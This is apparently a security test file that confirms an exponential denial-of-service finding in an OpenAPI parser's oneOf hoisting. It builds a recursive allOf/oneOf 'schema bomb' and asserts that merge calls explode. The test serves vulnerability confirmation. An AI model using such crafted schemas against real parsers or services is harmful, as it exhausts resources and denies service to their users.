/** @jest-environment node */
/** Confirm M5: hoistOneOfs exponential schema DoS */
import { OpenAPIParser } from '../../../src/services/OpenAPIParser';
import { AcmeNormalizedOptions } from '../../../src/services/AcmeNormalizedOptions';
import { SchemaModel } from '../../../src/services/models/Schema';

const SESSION = '00000000';
const opts = new AcmeNormalizedOptions({});

function buildBomb(width: number, depth: number): any {
  if (depth === 0) {
    return { type: 'object', properties: { leaf: { type: 'string' } } };
  }
  return {
    allOf: [
      {
        oneOf: Array.from({ length: width }, (_, i) => ({
          type: 'object',
          title: `Variant_${depth}_${i}`,
          properties: { [`p_${depth}_${i}`]: { type: 'string' } },
        })),
      },
      buildBomb(width, depth - 1),
    ],
  };
}

function measureMergeAllOfCalls(schema: any) {
  const parser = new OpenAPIParser({ openapi: '3.0.0', info: { title: 'x', version: '1' }, paths: {} } as any, undefined, opts);
  let mergeCalls = 0;
  const originalMergeAllOf = parser.mergeAllOf.bind(parser);
  parser.mergeAllOf = ((currentSchema: any, ref: string | undefined, refsStack: string[]) => {
    mergeCalls++;
    return originalMergeAllOf(currentSchema, ref, refsStack);
  }) as any;

  const model = new SchemaModel(parser, schema, '#/components/schemas/Attack', opts, false, []);
  return { mergeCalls, oneOfCount: model.oneOf?.length || 0 };
}

test(`test_confirm_hoistoneofs_exponential_schema_dos_${SESSION}`, () => {
  const baseline = measureMergeAllOfCalls(buildBomb(3, 4));
  const attack = measureMergeAllOfCalls(buildBomb(4, 5));

  console.log(JSON.stringify({ baseline, attack }));

  expect(baseline.mergeCalls).toBeGreaterThan(1000);
  expect(attack.oneOfCount).toBe(4);
  expect(attack.mergeCalls).toBeGreaterThan(12000);
  expect(attack.mergeCalls).toBeGreaterThan(baseline.mergeCalls * 10);
});
